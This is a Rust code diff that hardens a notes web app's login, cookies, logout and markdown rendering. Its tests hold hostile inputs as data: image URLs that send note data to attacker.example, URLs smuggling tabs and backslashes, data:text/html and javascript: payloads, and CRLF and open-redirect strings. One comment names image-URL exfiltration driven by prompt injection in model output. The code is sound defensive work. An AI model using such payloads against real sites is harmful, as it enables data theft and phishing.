@@ -20,6 +20,7 @@ use serde::Deserialize;
 
 use crate::api::auth;
 use crate::error::AppError;
+use crate::services::login_sessions;
 use crate::state::AppState;
 
 mod helpers;
@@ -45,7 +46,8 @@ pub fn router() -> Router<AppState> {
         .route("/", get(|| async { Redirect::to("/notes") }))
         .route("/static/{*path}", get(static_file))
         .route("/login", get(login_page).post(login_submit))
-        .route("/logout", get(logout).post(logout))
+        // POST only: a link or an <img> on another site must not sign you out.
+        .route("/logout", axum::routing::post(logout))
         .merge(notebooks::router())
         .merge(studio::router())
         .merge(sources::router())
@@ -117,19 +119,21 @@ impl PageContext {
     }
 }
 
+/// Restores the collapsed sidebar before first paint, so it cannot flash open.
+const SIDEBAR_INIT: &str = r#"try{if(localStorage.getItem("nn-sidebar-collapsed")==="true"){document.documentElement.classList.add("sidebar-collapsed");}}catch(error){}"#;
+
+/// Every inline `<script>` the pages render. They run before first paint (one
+/// uses `document.currentScript`), so they stay inline; the page CSP allows
+/// exactly these by hash, computed from these same strings so it cannot drift.
+pub(crate) const INLINE_SCRIPTS: [&str; 3] = [SIDEBAR_INIT, workspace::FOCUS_INIT, notebooks::COLUMNS_INIT];
+
 pub(crate) fn head(title: &str) -> Markup {
     html! {
         meta charset="utf-8";
         meta name="viewport" content="width=device-width, initial-scale=1";
         meta name="color-scheme" content="light dark";
         title { (title) " · Nova Notes" }
-        script { (PreEscaped(r#"
-            try {
-                if (localStorage.getItem("nn-sidebar-collapsed") === "true") {
-                    document.documentElement.classList.add("sidebar-collapsed");
-                }
-            } catch (error) {}
-        "#)) }
+        script { (PreEscaped(SIDEBAR_INIT)) }
         link rel="stylesheet" href=(asset_url("app.css"));
         @for area in AREAS {
             link rel="stylesheet" href=(asset_url(&format!("css/{area}.css")));
@@ -249,8 +253,69 @@ pub fn human_date(value: Option<chrono::DateTime<chrono::Utc>>) -> String {
 // Markdown
 // ---------------------------------------------------------------------------
 
+/// Whether an image URL stays on this server: a same-origin path or a
+/// `data:image/` URL. Anything else would make the browser fetch a remote URL
+/// as soon as the text renders, which leaks whatever a prompt injection put in
+/// the URL. Browsers drop tabs and newlines inside URLs, trim leading spaces
+/// and read `\` as `/`, so those make `/\t/evil.example` remote and are refused.
+pub(crate) fn is_local_image_src(src: &str) -> bool {
+    if src.chars().any(|c| matches!(c, '\t' | '\n' | '\r' | '\\')) {
+        return false;
+    }
+    let src = src.trim_start_matches(|c: char| c <= ' ');
+    if src.get(..11).is_some_and(|head| head.eq_ignore_ascii_case("data:image/")) {
+        return true;
+    }
+    if src.starts_with("//") {
+        return false;
+    }
+    // A scheme (`https:`, `blob:`, `javascript:`) before the first `/`, `?` or `#`.
+    !src.split(['/', '?', '#']).next().unwrap_or("").contains(':')
+}
+
+/// Markdown images that point off this server become plain links: the reader
+/// can still follow one, but nothing is fetched without a click.
+fn remote_images_to_links<'a>(parser: impl Iterator<Item = pulldown_cmark::Event<'a>>) -> Vec<pulldown_cmark::Event<'a>> {
+    use pulldown_cmark::{CowStr, Event, Tag, TagEnd};
+    // One entry per open image: (turned into a link, its URL, text seen inside).
+    let mut open: Vec<(bool, CowStr<'a>, bool)> = Vec::new();
+    let mut out = Vec::new();
+    for event in parser {
+        match event {
+            Event::Start(Tag::Image { link_type, dest_url, title, id }) => {
+                let remote = !is_local_image_src(&dest_url);
+                open.push((remote, dest_url.clone(), false));
+                out.push(Event::Start(if remote {
+                    Tag::Link { link_type, dest_url, title, id }
+                } else {
+                    Tag::Image { link_type, dest_url, title, id }
+                }));
+            }
+            Event::End(TagEnd::Image) => match open.pop() {
+                Some((true, url, saw_text)) => {
+                    if !saw_text {
+                        out.push(Event::Text(url));
+                    }
+                    out.push(Event::End(TagEnd::Link));
+                }
+                _ => out.push(Event::End(TagEnd::Image)),
+            },
+            Event::Text(ref text) | Event::Code(ref text) => {
+                if !text.trim().is_empty() {
+                    if let Some(top) = open.last_mut() {
+                        top.2 = true;
+                    }
+                }
+                out.push(event);
+            }
+            other => out.push(other),
+        }
+    }
+    out
+}
+
 /// Render untrusted markdown (model output, user notes, extracted web pages)
-/// to sanitised HTML.
+/// to sanitised HTML. Images load only from this server or `data:` URLs.
 pub fn markdown(text: &str) -> Markup {
     use pulldown_cmark::{html::push_html, Options, Parser};
     let mut options = Options::empty();
@@ -258,10 +323,23 @@ pub fn markdown(text: &str) -> Markup {
     options.insert(Options::ENABLE_STRIKETHROUGH);
     options.insert(Options::ENABLE_TASKLISTS);
     let mut raw = String::with_capacity(text.len() * 3 / 2);
-    push_html(&mut raw, Parser::new_ext(text, options));
+    push_html(&mut raw, remote_images_to_links(Parser::new_ext(text, options)).into_iter());
     let clean = ammonia::Builder::default()
         .link_rel(Some("noopener noreferrer nofollow"))
         .add_generic_attributes(["align"])
+        // `data:` is for inline images only; the filter drops it everywhere else.
+        .add_url_schemes(["data"])
+        .attribute_filter(|element, attribute, value| {
+            const URL_ATTRIBUTES: [&str; 6] = ["href", "src", "cite", "longdesc", "srcset", "poster"];
+            if element == "img" && attribute == "src" {
+                return is_local_image_src(value).then_some(value.into());
+            }
+            let is_data = value.trim_start().get(..5).is_some_and(|head| head.eq_ignore_ascii_case("data:"));
+            if URL_ATTRIBUTES.contains(&attribute) && is_data {
+                return None;
+            }
+            Some(value.into())
+        })
         .clean(&raw)
         .to_string();
     html! { div.prose { (PreEscaped(clean)) } }
@@ -292,7 +370,8 @@ pub type WebResult<T> = Result<T, WebError>;
 impl IntoResponse for WebError {
     fn into_response(self) -> Response {
         let status = self.0.status();
-        if status.is_server_error() {
+        // `detail()` logs a 500 itself (and shows a generic message).
+        if status.is_server_error() && status != StatusCode::INTERNAL_SERVER_ERROR {
             tracing::error!(%status, "{}", self.0);
         }
         // The client script reads `data-error-detail` for its toast, so the
@@ -409,44 +488,83 @@ struct LoginForm {
     next: Option<String>,
 }
 
-fn session_cookie(value: &str, max_age: i64, secure: bool) -> HeaderValue {
+fn session_cookie(name: &str, value: &str, max_age: i64, secure: bool) -> HeaderValue {
     let secure = if secure { "; Secure" } else { "" };
-    HeaderValue::from_str(&format!(
-        "{}={value}; Path=/; HttpOnly; SameSite=Lax; Max-Age={max_age}{secure}",
+    HeaderValue::from_str(&format!("{name}={value}; Path=/; HttpOnly; SameSite=Lax; Max-Age={max_age}{secure}"))
+        .expect("cookie value is ASCII")
+}
+
+/// The session cookie's name: `__Host-` prefixed over HTTPS (it must be
+/// `Secure`), the plain name on HTTP localhost where `Secure` cannot be set.
+fn session_cookie_name(https: bool) -> &'static str {
+    if https {
+        auth::SECURE_SESSION_COOKIE
+    } else {
         auth::SESSION_COOKIE
-    ))
-    .expect("cookie value is ASCII")
+    }
 }
 
-/// Mark the cookie Secure when the request reached us over HTTPS (directly or
-/// through a proxy such as Tailscale Serve), so it still works on plain-HTTP
-/// localhost.
-fn is_https(headers: &HeaderMap) -> bool {
-    headers
-        .get("x-forwarded-proto")
-        .and_then(|v| v.to_str().ok())
-        .is_some_and(|v| v.eq_ignore_ascii_case("https"))
+/// Whether the browser reached us over HTTPS, so the cookie can be `Secure`
+/// (it must still work on plain-HTTP localhost). Forwarded headers count only
+/// behind a trusted proxy; see [`crate::api::perimeter::request_origin`].
+fn is_https(state: &AppState, headers: &HeaderMap) -> bool {
+    crate::api::perimeter::request_origin(&state.config, headers).https
 }
 
-async fn login_submit(State(state): State<AppState>, headers: HeaderMap, Form(form): Form<LoginForm>) -> Response {
+async fn login_submit(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    extensions: axum::http::Extensions,
+    Form(form): Form<LoginForm>,
+) -> Response {
     let next = safe_next(form.next.as_deref());
     let Some(password) = state.config.password.as_deref() else {
         return Redirect::to(&next).into_response();
     };
+    let client = auth::client_ip(&state.config, &headers, &extensions);
+    if let Err(wait) = state.login_throttle.check(client) {
+        let seconds = wait.as_secs() + u64::from(wait.subsec_nanos() > 0);
+        let mut response = (StatusCode::TOO_MANY_REQUESTS, login_form(&next, Some(&auth::throttled_detail(wait)))).into_response();
+        response.headers_mut().insert(header::RETRY_AFTER, HeaderValue::from(seconds.max(1)));
+        return response;
+    }
     if !auth::constant_time_eq(form.password.as_bytes(), password.as_bytes()) {
-        tracing::warn!("Failed sign-in attempt");
+        tracing::warn!("Failed sign-in attempt from {client}");
+        state.login_throttle.record_failure(client);
         let target = format!("/login?error=1&next={}", auth::encode_query_value(&next));
         return Redirect::to(&target).into_response();
     }
-    let cookie = session_cookie(&auth::session_token(password), 60 * 60 * 24 * 30, is_https(&headers));
+    state.login_throttle.record_success(client);
+    let session = match login_sessions::create(&state, password).await {
+        Ok(session) => session,
+        Err(e) => return WebError(e).into_response(),
+    };
+    let https = is_https(&state, &headers);
+    let name = session_cookie_name(https);
     let mut response = Redirect::to(&next).into_response();
-    response.headers_mut().insert(header::SET_COOKIE, cookie);
+    response
+        .headers_mut()
+        .append(header::SET_COOKIE, session_cookie(name, &session, login_sessions::LIFETIME_SECONDS, https));
+    if https {
+        // Retire a cookie from before the `__Host-` name.
+        response.headers_mut().append(header::SET_COOKIE, session_cookie(auth::SESSION_COOKIE, "", 0, true));
+    }
     response
 }
 
-async fn logout(headers: HeaderMap) -> Response {
+/// Sign out: end the session on the server and clear the cookie.
+async fn logout(State(state): State<AppState>, headers: HeaderMap) -> Response {
+    for id in auth::session_ids(&headers) {
+        if let Err(e) = login_sessions::revoke(&state, id).await {
+            return WebError(e).into_response();
+        }
+    }
+    let https = is_https(&state, &headers);
     let mut response = Redirect::to("/login").into_response();
-    response.headers_mut().insert(header::SET_COOKIE, session_cookie("", 0, is_https(&headers)));
+    response.headers_mut().append(header::SET_COOKIE, session_cookie(auth::SESSION_COOKIE, "", 0, https));
+    if https {
+        response.headers_mut().append(header::SET_COOKIE, session_cookie(auth::SECURE_SESSION_COOKIE, "", 0, true));
+    }
     response
 }
 
@@ -486,6 +604,51 @@ mod tests {
         assert!(!out.contains("javascript:"), "{out}");
     }
 
+    #[test]
+    fn remote_images_render_as_links() {
+        let out = markdown(
+            "![secret](https://attacker.example/p?d=notes)\n\n![](//attacker.example/x.png)\n\n\
+             <img src=\"https://attacker.example/raw.png\"> <img src=\"/\\attacker.example/a.png\"> \
+             <img src=\"/\t/attacker.example/b.png\"> <img src=\"blob:https://x/1\">",
+        )
+        .into_string();
+        assert!(!out.contains("<img src=\"https:"), "{out}");
+        assert!(!out.contains("src=\"//"), "{out}");
+        assert!(!out.contains("attacker.example/raw.png"), "{out}");
+        assert!(!out.contains("src=\"/\\"), "{out}");
+        assert!(!out.contains("src=\"blob:"), "{out}");
+        // Markdown images become links the reader can still follow.
+        assert!(out.contains("<a href=\"https://attacker.example/p?d=notes\" rel=\"noopener noreferrer nofollow\">secret</a>"), "{out}");
+        assert!(out.contains(">//attacker.example/x.png</a>"), "{out}");
+    }
+
+    #[test]
+    fn local_and_data_images_still_render() {
+        let out = markdown("![pic](/note-blobs/abc123)\n\n![rel](images/a.png)\n\n![dot](data:image/png;base64,iVBORw0KGgo=)").into_string();
+        assert!(out.contains("<img src=\"/note-blobs/abc123\" alt=\"pic\">"), "{out}");
+        assert!(out.contains("<img src=\"images/a.png\""), "{out}");
+        assert!(out.contains("<img src=\"data:image/png;base64,iVBORw0KGgo=\""), "{out}");
+        // data: is for images only.
+        let out = markdown("[x](data:text/html;base64,PHNjcmlwdD4=) <a href=\"data:text/html,hi\">y</a>").into_string();
+        assert!(!out.contains("data:"), "{out}");
+        for (src, local) in [
+            ("/note-blobs/x", true),
+            ("a/b.png", true),
+            ("?x=1", true),
+            ("DATA:image/png;base64,AA", true),
+            ("https://x.example/a.png", false),
+            ("HTTP://x.example", false),
+            ("//x.example/a", false),
+            (" //x.example/a", false),
+            ("/\\x.example/a", false),
+            ("/\t/x.example", false),
+            ("data:text/html,x", false),
+            ("javascript:alert(1)", false),
+        ] {
+            assert_eq!(is_local_image_src(src), local, "{src:?}");
+        }
+    }
+
     #[tokio::test]
     async fn static_assets_are_served() {
         let app = TestApp::new().await;
@@ -496,6 +659,18 @@ mod tests {
         }
         let (status, _) = app.text(Method::GET, "/static/nope.css", None).await;
         assert_eq!(status, StatusCode::NOT_FOUND);
+    }
+
+    #[tokio::test]
+    async fn error_pages_hide_internal_text() {
+        let response = WebError(AppError::database("Parse error near SELECT * FROM credential at /srv/data")).into_response();
+        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        let body = String::from_utf8(
+            http_body_util::BodyExt::collect(response.into_body()).await.unwrap().to_bytes().to_vec(),
+        )
+        .unwrap();
+        assert!(!body.contains("credential") && !body.contains("/srv/data"), "{body}");
+        assert!(body.contains(crate::error::INTERNAL_DETAIL), "{body}");
     }
 
     #[tokio::test]
@@ -515,6 +690,8 @@ mod tests {
         let mut app = TestApp::new().await;
         let mut config = (*app.state.config).clone();
         config.password = Some("hunter2".into());
+        // Behind Tailscale Serve or another proxy that sets X-Forwarded-Proto.
+        config.trust_proxy_headers = true;
         app.state.config = std::sync::Arc::new(config);
         app.router = crate::api::build_router(app.state.clone());
 
@@ -555,5 +732,205 @@ mod tests {
 
         let out = app.send(Request::builder().method(Method::POST).uri("/logout").body(Body::empty()).unwrap()).await;
         assert!(out.headers()[header::SET_COOKIE].to_str().unwrap().contains("Max-Age=0"));
+        // A link or an image on another page cannot sign you out.
+        let get_out = app.send(Request::builder().uri("/logout").body(Body::empty()).unwrap()).await;
+        assert_eq!(get_out.status(), StatusCode::METHOD_NOT_ALLOWED);
+        assert!(get_out.headers().get(header::SET_COOKIE).is_none());
+
+        // Over HTTPS the cookie takes the `__Host-` name, and the old name is retired.
+        let mut secure = form("hunter2");
+        secure.headers_mut().insert("x-forwarded-proto", HeaderValue::from_static("https"));
+        let right = app.send(secure).await;
+        let cookies: Vec<String> =
+            right.headers().get_all(header::SET_COOKIE).iter().map(|v| v.to_str().unwrap().to_string()).collect();
+        let host_cookie = cookies.iter().find(|c| c.starts_with("__Host-nn_session=")).expect("__Host- cookie");
+        assert!(host_cookie.contains("; Secure") && host_cookie.contains("Path=/") && !host_cookie.contains("Domain"), "{host_cookie}");
+        assert!(cookies.iter().any(|c| c.starts_with("nn_session=;") && c.contains("Max-Age=0")), "{cookies:?}");
+        let pair = host_cookie.split(';').next().unwrap().to_string();
+        let response =
+            app.send(Request::builder().uri("/api/commands/jobs").header(header::COOKIE, &pair).body(Body::empty()).unwrap()).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        // The old password-derived cookie no longer opens anything.
+        let legacy = {
+            use sha2::{Digest, Sha256};
+            format!("nn_session={}", hex::encode(Sha256::digest(b"nova-notes-session-v1:hunter2")))
+        };
+        let response =
+            app.send(Request::builder().uri("/api/commands/jobs").header(header::COOKIE, &legacy).body(Body::empty()).unwrap()).await;
+        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
+        let mut secure_out = Request::builder().method(Method::POST).uri("/logout").body(Body::empty()).unwrap();
+        secure_out.headers_mut().insert("x-forwarded-proto", HeaderValue::from_static("https"));
+        let out = app.send(secure_out).await;
+        let cleared: Vec<&str> = out.headers().get_all(header::SET_COOKIE).iter().map(|v| v.to_str().unwrap()).collect();
+        assert!(cleared.iter().any(|c| c.starts_with("__Host-nn_session=;") && c.contains("Max-Age=0") && c.contains("Secure")), "{cleared:?}");
+        assert!(cleared.iter().any(|c| c.starts_with("nn_session=;") && c.contains("Max-Age=0")), "{cleared:?}");
+    }
+
+    async fn with_password(password: &str) -> TestApp {
+        let mut app = TestApp::new().await;
+        let mut config = (*app.state.config).clone();
+        config.password = Some(password.into());
+        app.state.config = std::sync::Arc::new(config);
+        app.router = crate::api::build_router(app.state.clone());
+        app
+    }
+
+    fn sign_in(password: &str, ip: &str) -> Request<Body> {
+        let mut request = Request::builder()
+            .method(Method::POST)
+            .uri("/login")
+            .header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
+            .body(Body::from(format!("password={password}&next=%2Fnotebooks")))
+            .unwrap();
+        let addr: std::net::SocketAddr = format!("{ip}:40000").parse().unwrap();
+        request.extensions_mut().insert(axum::extract::ConnectInfo(addr));
+        request
+    }
+
+    /// The `name=value` pair of the session cookie a sign-in set.
+    fn session_pair(response: &Response) -> String {
+        let cookie = response.headers()[header::SET_COOKIE].to_str().unwrap();
+        cookie.split(';').next().unwrap().to_string()
+    }
+
+    async fn status_with_cookie(app: &TestApp, cookie: &str) -> StatusCode {
+        app.send(Request::builder().uri("/api/commands/jobs").header(header::COOKIE, cookie).body(Body::empty()).unwrap())
+            .await
+            .status()
+    }
+
+    #[tokio::test]
+    async fn each_sign_in_gets_its_own_session_and_sign_out_ends_it() {
+        let app = with_password("hunter2").await;
+        let first = session_pair(&app.send(sign_in("hunter2", "192.0.2.1")).await);
+        let second = session_pair(&app.send(sign_in("hunter2", "192.0.2.1")).await);
+        assert_ne!(first, second);
+        assert!(!first.contains("hunter2"));
+        assert_eq!(status_with_cookie(&app, &first).await, StatusCode::OK);
+        assert_eq!(status_with_cookie(&app, &second).await, StatusCode::OK);
+
+        let out = app
+            .send(Request::builder().method(Method::POST).uri("/logout").header(header::COOKIE, &first).body(Body::empty()).unwrap())
+            .await;
+        assert_eq!(out.status(), StatusCode::SEE_OTHER);
+        // A replayed copy of the signed-out cookie is refused by the server.
+        assert_eq!(status_with_cookie(&app, &first).await, StatusCode::UNAUTHORIZED);
+        assert_eq!(status_with_cookie(&app, &second).await, StatusCode::OK);
+    }
+
+    #[tokio::test]
+    async fn a_new_password_ends_existing_sessions() {
+        let mut app = with_password("hunter2").await;
+        let cookie = session_pair(&app.send(sign_in("hunter2", "192.0.2.1")).await);
+        assert_eq!(status_with_cookie(&app, &cookie).await, StatusCode::OK);
+
+        // Restart with a different OPEN_NOTEBOOK_PASSWORD on the same database.
+        let mut config = (*app.state.config).clone();
+        config.password = Some("correct horse".into());
+        app.state.config = std::sync::Arc::new(config);
+        app.router = crate::api::build_router(app.state.clone());
+        assert_eq!(status_with_cookie(&app, &cookie).await, StatusCode::UNAUTHORIZED);
+        let fresh = session_pair(&app.send(sign_in("correct%20horse", "192.0.2.1")).await);
+        assert_eq!(status_with_cookie(&app, &fresh).await, StatusCode::OK);
+    }
+
+    /// Without a trusted proxy, `X-Forwarded-Proto` does not decide the
+    /// cookie; an https public URL for the requested host does.
+    #[tokio::test]
+    async fn the_secure_flag_follows_the_trust_rule() {
+        let mut app = with_password("hunter2").await;
+        let mut request = sign_in("hunter2", "192.0.2.1");
+        request.headers_mut().insert("x-forwarded-proto", HeaderValue::from_static("https"));
+        let cookie = app.send(request).await.headers()[header::SET_COOKIE].to_str().unwrap().to_string();
+        assert!(cookie.starts_with("nn_session=") && !cookie.contains("Secure"), "{cookie}");
+
+        let mut config = (*app.state.config).clone();
+        config.allowed_hosts.push("notes.example.ts.net".into());
+        config.public_origins.push("https://notes.example.ts.net".into());
+        app.state.config = std::sync::Arc::new(config);
+        app.router = crate::api::build_router(app.state.clone());
+        let mut request = sign_in("hunter2", "192.0.2.1");
+        request.headers_mut().insert(header::HOST, HeaderValue::from_static("notes.example.ts.net"));
+        let response = app.send(request).await;
+        let cookies: Vec<&str> = response.headers().get_all(header::SET_COOKIE).iter().map(|v| v.to_str().unwrap()).collect();
+        assert!(cookies.iter().any(|c| c.starts_with("__Host-nn_session=") && c.contains("; Secure")), "{cookies:?}");
+    }
+
+    #[tokio::test]
+    async fn repeated_wrong_passwords_are_throttled() {
+        let app = with_password("hunter2").await;
+        for _ in 0..5 {
+            let response = app.send(sign_in("nope", "192.0.2.7")).await;
+            assert_eq!(response.status(), StatusCode::SEE_OTHER);
+            assert!(response.headers()[header::LOCATION].to_str().unwrap().starts_with("/login?error=1"));
+        }
+        let response = app.send(sign_in("hunter2", "192.0.2.7")).await;
+        assert_eq!(response.status(), StatusCode::TOO_MANY_REQUESTS);
+        assert!(response.headers().get(header::SET_COOKIE).is_none());
+        assert!(response.headers().contains_key(header::RETRY_AFTER));
+        let body = String::from_utf8(
+            http_body_util::BodyExt::collect(response.into_body()).await.unwrap().to_bytes().to_vec(),
+        )
+        .unwrap();
+        assert!(body.contains("Too many failed sign-in attempts"), "{body}");
+        // Someone else can still sign in.
+        let response = app.send(sign_in("hunter2", "192.0.2.8")).await;
+        assert_eq!(response.status(), StatusCode::SEE_OTHER);
+        assert!(response.headers().contains_key(header::SET_COOKIE));
+    }
+
+    /// `next` can never send the browser to another site, whatever bytes it
+    /// smuggles (browsers drop tab, CR and LF and read `\\` as `/`), and odd
+    /// bytes never crash the handler.
+    #[tokio::test]
+    async fn login_next_cannot_leave_the_site() {
+        let app = TestApp::new().await; // no password: `/login` redirects at once
+        for (next, expected) in [
+            ("/%09/evil.example", "/notebooks"),
+            ("/%5Cevil.example", "/notebooks"),
+            ("%2F%2Fevil.example", "/notebooks"),
+            ("//evil.example", "/notebooks"),
+            ("/%5C%5Cevil.example", "/notebooks"),
+            ("/a%5Cb", "/notebooks"),
+            ("/%0D%0ALocation:%20https://evil.example", "/notebooks"),
+            ("/%0Aevil", "/notebooks"),
+            ("/%0D", "/notebooks"),
+            ("/%7F/evil.example", "/notebooks"),
+            ("https://evil.example", "/notebooks"),
+            ("/notebooks/x%3Fy%3D1%23z", "/notebooks/x?y=1#z"),
+            ("/sources", "/sources"),
+        ] {
+            let response = app.send(Request::builder().uri(format!("/login?next={next}")).body(Body::empty()).unwrap()).await;
+            assert_eq!(response.status(), StatusCode::SEE_OTHER, "{next}");
+            assert_eq!(response.headers()[header::LOCATION], expected, "{next}");
+        }
+    }
+
+    /// Every inline `<script>` a page renders must be allowed by the page CSP,
+    /// or the browser silently skips it. Catches a script edited (or added)
+    /// without going through `INLINE_SCRIPTS`.
+    #[tokio::test]
+    async fn the_page_csp_allows_every_inline_script_it_renders() {
+        let app = TestApp::new().await;
+        let (_, nb) = app.post("/api/notebooks", serde_json::json!({ "name": "CSP", "description": "" })).await;
+        let nb_path = format!("/notebooks/{}", auth::encode_query_value(nb["id"].as_str().unwrap()));
+        let inline = regex::Regex::new(r"(?s)<script>(.*?)</script>").unwrap();
+        let mut seen = std::collections::HashSet::new();
+        for path in ["/notebooks", "/notes", nb_path.as_str(), "/no/such/page", "/sources", "/search"] {
+            let response = app.send(Request::builder().uri(path).body(Body::empty()).unwrap()).await;
+            let csp = response.headers()[header::CONTENT_SECURITY_POLICY].to_str().unwrap().to_string();
+            let body = String::from_utf8(
+                http_body_util::BodyExt::collect(response.into_body()).await.unwrap().to_bytes().to_vec(),
+            )
+            .unwrap();
+            for script in inline.captures_iter(&body) {
+                let hash = crate::api::perimeter::script_hash(&script[1]);
+                assert!(csp.contains(&hash), "{path}: inline script not allowed by the CSP: {}", &script[1]);
+                seen.insert(script[1].to_string());
+            }
+        }
+        for script in INLINE_SCRIPTS {
+            assert!(seen.contains(script), "never rendered: {script}");
+        }
     }
 }
